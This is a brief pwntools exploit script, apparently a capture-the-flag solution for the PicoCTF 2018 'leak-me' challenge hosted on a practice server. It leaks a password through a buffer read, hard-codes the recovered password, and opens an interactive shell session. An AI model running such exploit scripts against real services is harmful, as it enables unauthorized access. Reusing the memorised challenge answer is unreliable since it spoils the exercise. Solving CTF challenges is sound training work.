from pwn import *
context.log_level = 'debug'

# io = process('./PicoCTF_2018_leak-me')
io = remote('node4.buuoj.cn',26336)
# io.sendafter(b'name',b'a'*256)
io.sendlineafter(b'name',b'a')
# io.recvuntil(b'a'*256)
password = b'a_reAllY_s3cuRe_p4s$word_f85406'
io.sendlineafter(b'Hello',password)
io.interactive()